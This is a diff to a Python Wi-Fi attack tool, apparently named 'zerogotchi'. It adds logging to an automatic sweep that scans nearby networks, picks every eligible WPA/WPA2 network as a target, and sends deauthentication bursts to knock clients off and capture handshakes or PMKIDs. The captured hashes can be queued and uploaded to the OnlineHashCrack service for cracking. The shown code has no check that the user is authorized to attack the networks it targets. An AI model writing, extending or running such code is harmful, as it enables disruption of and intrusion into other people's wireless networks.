@@ -11,6 +11,7 @@ import subprocess
 import tempfile
 import time
 from dataclasses import dataclass
+from datetime import datetime
 from urllib.error import HTTPError, URLError
 from urllib.request import Request, urlopen
 
@@ -19,7 +20,9 @@ API_URL = "https://api.onlinehashcrack.com/v2"
 KEY_PATTERN = re.compile(r"sk_[A-Za-z0-9]{32,64}")
 MAC_PATTERN = re.compile(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
 CONFIG = Path(os.environ.get("XDG_CONFIG_HOME") or Path.home() / ".config") / "zerogotchi"
-CAPTURES = Path(os.environ.get("XDG_DATA_HOME") or Path.home() / ".local/share") / "zerogotchi/captures"
+DATA = Path(os.environ.get("XDG_DATA_HOME") or Path.home() / ".local/share") / "zerogotchi"
+CAPTURES = DATA / "captures"
+AUTO_LOG = DATA / "auto-session.log"
 HELPER = "/usr/lib/zerogotchi/radio"
 
 
@@ -81,12 +84,14 @@ def split_nmcli(line):
     return fields
 
 
-def scan():
-    interface = ["ifname", "wlan0"] if read_setting("adapter") == "wlan0" else []
+def scan(*, include_ignored=False, interface=None):
+    if interface is None and read_setting("adapter") == "wlan0":
+        interface = "wlan0"
+    device = ["ifname", interface] if interface else []
     try:
         result = subprocess.run(
             ["nmcli", "-t", "-e", "yes", "-f", "BSSID,SSID,FREQ,SIGNAL,SECURITY",
-             "device", "wifi", "list", *interface, "--rescan", "yes"],
+             "device", "wifi", "list", *device, "--rescan", "yes"],
             env={**os.environ, "LC_ALL": "C"}, capture_output=True, text=True,
             errors="replace", timeout=20, check=True,
         )
@@ -105,6 +110,8 @@ def scan():
             continue
         if network.bssid not in by_bssid or network.signal > by_bssid[network.bssid].signal:
             by_bssid[network.bssid] = network
+    if include_ignored:
+        return sorted(by_bssid.values(), key=lambda network: -network.signal)
     ignored = blacklist()
     return sorted((network for network in by_bssid.values() if not is_ignored(network, ignored)),
                   key=lambda network: -network.signal)
@@ -314,6 +321,11 @@ def capture(network, interface, mode, password, cancel, report, *, time_limit=No
                 status = process.wait()
             end = os.fstat(errors.fileno()).st_size
             detail = os.pread(errors.fileno(), 8192, max(0, end - 8192)).decode(errors="replace")
+        if radio_report:
+            updates = re.findall(r"^ZG STATE (Listening|Deauthing) (\d+)$", detail, re.MULTILINE)
+            if updates and int(updates[-1][1]) > sent:
+                phase, count = updates[-1]
+                radio_report("Saving" if hashes else phase, int(count))
         if status:
             error = radio_error(detail)
             if pcap and pcap.stat().st_size > 24:
@@ -345,22 +357,60 @@ def capture(network, interface, mode, password, cancel, report, *, time_limit=No
 
 
 def auto_capture(interface, password, cancel, report, *, auto_upload=False, target_seconds=25):
-    nearby = scan()
+    AUTO_LOG.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
+    fd = os.open(AUTO_LOG, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)
+    with os.fdopen(fd, "w", encoding="utf-8", buffering=1) as output:
+        os.fchmod(output.fileno(), 0o600)
+
+        def log(message):
+            output.write(f"{datetime.now().astimezone().isoformat(timespec='seconds')} {message}\n")
+
+        log(f"Auto started on {interface}, target dwell {target_seconds}s")
+        try:
+            return run_auto(interface, password, cancel, report, log, auto_upload, target_seconds)
+        except (WifiError, OSError) as error:
+            log(f"Session ended with error: {error}")
+            raise
+
+
+def skip_reason(network, ignored, captured, channels):
+    if network.ssid in ignored:
+        return "SSID blacklist"
+    if not network.ssid:
+        return "hidden SSID"
+    if network.bssid.replace(":", "").lower() in captured:
+        return "saved handshake or PMKID for this BSSID"
+    if network.frequency not in channels:
+        return "frequency unsupported by selected adapter"
+    security = set(network.security.split())
+    if not {"WPA", "WPA1", "WPA2"}.intersection(security) or "802.1X" in security:
+        return f"ineligible security ({network.security or 'open'})"
+    return ""
+
+
+def run_auto(interface, password, cancel, report, log, auto_upload, target_seconds):
+    nearby = scan(include_ignored=True)
     channels = supported_channels(interface)
     captured = {bssid for _, bssids in saved_handshakes() for bssid in bssids}
-    targets = [network for network in nearby if network.ssid
-               and {"WPA", "WPA1", "WPA2"}.intersection(network.security.split())
-               and "802.1X" not in network.security and network.frequency in channels
-               and network.bssid.replace(":", "").lower() not in captured]
+    ignored = blacklist()
+    targets = []
+    log(f"Scan discovered {len(nearby)} BSSIDs")
+    for network in nearby:
+        reason = skip_reason(network, ignored, captured, channels)
+        if reason:
+            log(f"Skip {network.ssid!r} {network.bssid} {network.frequency} MHz: {reason}")
+        else:
+            targets.append(network)
     skipped = len(nearby) - len(targets)
     attempted = found = failed = 0
     uploaded = upload_failed = 0
     queue = []
     next_upload = 0
+    deauths_total = 0
 
-    def status(phase, network="", deauths=0):
+    def status(phase, network=""):
         return AutoStatus(phase, network, attempted, len(targets), found, skipped,
-                          failed, uploaded, len(queue), upload_failed, deauths)
+                          failed, uploaded, len(queue), upload_failed, deauths_total)
 
     def send_pending(phase):
         nonlocal uploaded, upload_failed, next_upload
@@ -370,12 +420,15 @@ def auto_capture(interface, password, cancel, report, *, auto_upload=False, targ
                 accepted, skipped_count, rejected = upload(queue[0])
             except UploadRetry as error:
                 next_upload = time.monotonic() + error.delay
+                log(f"OnlineHashCrack deferred; retry in {error.delay}s")
                 break
-            except (WifiError, OSError):
+            except (WifiError, OSError) as error:
                 upload_failed += 1
+                log(f"OnlineHashCrack upload failed: {error}")
             else:
                 uploaded += int(bool(accepted or skipped_count))
                 upload_failed += int(bool(rejected))
+                log(f"OnlineHashCrack result: accepted {accepted}, skipped {skipped_count}, rejected {rejected}")
             queue.pop(0)
 
     if targets and not cancel.is_set():
@@ -387,11 +440,23 @@ def auto_capture(interface, password, cancel, report, *, auto_upload=False, targ
                 attempted += 1
                 report(status("Tuning", network.ssid))
                 mode = "active" if channels[network.frequency] and network.frequency < 5925 else "passive"
+                log(f"Target {network.ssid!r} {network.bssid} {network.frequency} MHz: {mode}")
 
                 def run_target(mode, seconds):
+                    last_count = 0
+                    last_phase = ""
+
+                    def radio_update(phase, count):
+                        nonlocal deauths_total, last_count, last_phase
+                        deauths_total += max(0, count - last_count)
+                        if phase != last_phase or count != last_count:
+                            log(f"{network.bssid}: {phase}; {count} completed deauth bursts on this attempt")
+                        last_phase, last_count = phase, count
+                        report(status(phase, network.ssid))
+
                     return capture(network, interface, mode, password, cancel, lambda message: None,
                                    time_limit=seconds, monitor=monitor,
-                                   radio_report=lambda phase, count: report(status(phase, network.ssid, count)))
+                                   radio_report=radio_update)
 
                 try:
                     try:
@@ -400,28 +465,36 @@ def auto_capture(interface, password, cancel, report, *, auto_upload=False, targ
                         if cancel.is_set():
                             break
                         report(status("Retrying", network.ssid))
+                        log(f"{network.bssid}: no packets; retrying passively")
                         _, hashes, _ = run_target("passive", min(8, target_seconds))
                 except AuthenticationError:
                     raise
                 except EmptyCapture:
                     if not cancel.is_set():
                         skipped += 1
+                        log(f"Skip {network.bssid}: no packets after retry")
                 except WifiError as error:
                     if not cancel.is_set():
                         failed += 1
+                        log(f"Failed {network.bssid}: {error}")
                         report(status("Skipping", str(error)))
                 else:
                     found += int(hashes is not None)
+                    log(f"{network.bssid}: {'usable hash saved' if hashes else 'PCAP saved; no usable hash'}")
                     if hashes and auto_upload:
                         queue.append(hashes)
                 send_pending("Uploading")
     del password
+    log(f"Sweep ended: {attempted} attempted, {found} hashes, {skipped} skipped, "
+        f"{failed} failed, {deauths_total} deauth bursts")
     while queue and not cancel.is_set():
         report(status("Idling"))
         if cancel.wait(max(0, next_upload - time.monotonic())):
             break
         send_pending("Idling")
-    return status("Stopped" if cancel.is_set() else "Idling")
+    phase = "Stopped" if cancel.is_set() else "Idling"
+    log(f"{phase}: {uploaded} uploaded, {len(queue)} queued, {upload_failed} upload failures")
+    return status(phase)
 
 
 def capture_name(path):
